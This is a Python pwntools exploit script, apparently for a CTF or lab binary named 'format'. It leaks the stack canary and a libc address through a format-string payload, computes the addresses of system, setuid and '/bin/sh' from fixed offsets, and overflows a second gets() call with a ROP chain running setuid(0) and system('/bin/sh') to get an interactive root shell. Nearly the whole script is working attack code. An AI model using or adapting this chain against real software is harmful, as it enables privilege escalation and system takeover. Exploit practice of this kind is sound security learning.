#!/usr/bin/env python3

from pwn import *

p = process('./format')

# binary flow:
# - gets()
# - printf() of input (format string) that leads to canary disclosure
# - gets() that leads to stack overflow
# 

# let's run the program in gdb and gets some addressAddress in memory (libc and code) 
system_offset  =  0x7ffff7e0f330 - 0x7ffff7dea18a
setuid_offset  =  0x7ffff7e98420 - 0x7ffff7dea18a
binsh_offset   =  0x7ffff7f59031 - 0x7ffff7dea18a
pop_rdi = 0x004008d3
ret     = 0x00400599

# Format string (gets 15th value from current position on the stack = the canary)
payload = b"%15$p%17$p"

p.recvuntil("Name: ")
p.sendline(payload)

# Receive the canary by printf and logs it.
#canary = int(p.recvline(), 16)
output = p.recvline()
canary = int(output[6:24],16)
#leak = int((b'\x00\x00'+output[26:].rstrip(b'\n')),16)
leak = int((b'0x0000'+output[26:].rstrip(b'\n')),16)
log.success(f'Canary   : {hex(canary)}')
log.success(f'libc Leak: {hex(leak)}')

system = leak + system_offset
binsh = leak + binsh_offset
setuid = leak + setuid_offset

log.success(f'system @: {hex(system)}')
log.success(f'binsh  @: {hex(binsh)}')
log.success(f'setuid @: {hex(setuid)}')


# Prepare payload for second gets() to code execution
payload = b"A"* 136         # overflow offset (until the canary): it must be found analsying the 
payload += p64(canary)      # 
payload += b"AAAABBBB"      # Distance from canary to return address

# concatenates setuid(0) and execve("/bin/sh")
payload += p64(pop_rdi)    # 
payload += p64(0x00)       # 
payload += p64(setuid)     # 
payload += p64(pop_rdi)    # 
payload += p64(binsh)      # 
#payload += p64(ret)       # advance on stack of 8 bytes (aligns to 16 bytes - not needed because of the return from setuid)
payload += p64(system)     # 

# Proceed to next input, send payload and goes interactive
p.recvuntil("Code: ")
p.sendline(payload)
p.interactive()
